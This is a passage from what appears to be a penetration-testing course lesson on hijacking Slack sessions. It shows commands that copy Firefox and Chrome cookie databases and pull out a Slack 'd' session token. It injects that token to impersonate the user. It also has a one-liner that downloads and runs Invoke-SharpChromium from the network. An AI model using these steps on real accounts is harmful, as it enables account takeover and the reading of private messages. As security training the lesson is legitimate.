## Abusing Cookies to Get Access to IM Clients

With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like `Slack` and `Microsoft Teams`
 have become staples of modern office communications. These applications
 help in improving collaboration between co-workers and teams. If we 
compromise a user account and gain access to an IM Client, we can look 
for information in private chats and groups.

There are multiple options to gain access to an IM Client; one 
standard method is to use the user's credentials to get into the cloud 
version of the instant messaging application as the regular user would.

If the user is using any form of multi-factor authentication, or we 
can't get the user's plaintext credentials, we can try to steal the 
user's cookies to log in to the cloud-based client.

There are often tools that may help us automate the process, but as 
the cloud and applications constantly evolve, we may find these 
applications out of date, and we still need to find a way to gather 
information from the IM clients. Understanding how to abuse credentials,
 cookies, and tokens is often helpful in accessing web applications such
 as IM Clients.

Let's use `Slack` as an example. Multiple posts refer to how to abuse `Slack` such as [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/). We can use them to understand better how Slack tokens and cookies work, but keep in mind that `Slack's` behavior may have changed since the release of those posts.

There's also a tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018, which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack`
 uses to store the user's authentication token. If we can get our hands 
on that cookie, we will be able to authenticate as the user. Instead of 
using the tool, we will attempt to obtain the cookie from Firefox or a 
Chromium-based browser and authenticate as the user.

### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

### Copy Firefox Cookies Database

Pillaging

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

### Extract Slack Cookie from Firefox Cookies Database

Pillaging

```
doshim@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)

```

Now that we have the cookie, we can use any browser extension to add 
the cookie to our browser. For this example, we will use Firefox and the
 extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/).
 Make sure to install the extension by clicking the link, selecting your
 browser, and adding the extension. Once the extension is installed, you
 will see something like this:

Our target website is `slack.com`. Now that we have the 
cookie, we want to impersonate the user. Let's navigate to slack.com 
once the page loads, click on the icon for the Cookie-Editor extension, 
and modify the value of the `d` cookie with the value you 
have from the cookieextractor.py script. Make sure to click the save 
icon (marked in red in the image below).

![https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.

![https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

Now we are logged in as the user and can click on `Launch Slack`.
 We may get a prompt for credentials or other types of authentication 
information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

![https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.

After gaining access, we can use built-in functions to search for 
common words like passwords, credentials, PII, or any other information 
relevant to our assessment.

### Cookie Extraction from Chromium-based Browsers

The chromium-based browser also stores its cookies information in an 
SQLite database. The only difference is that the cookie value is 
encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine 
from the session of the user we compromised. Thankfully, a tool [SharpChromium](https://github.com/djhohnstein/SharpChromium)
 does what we need. It connects to the current user SQLite cookie 
database, decrypts the cookie value, and presents the result in JSON 
format.

Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.

### PowerShell Script - Invoke-SharpChromium

Pillaging

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)

   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)

[*] Done.

```

We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

We can modify the code of `SharpChromium` or copy the cookie file to where SharpChromium is looking.

`SharpChromium` is looking for a file in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, but the actual file is located in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

### Copy Cookies to SharpChromium Expected Location

Pillaging

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

```

We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.
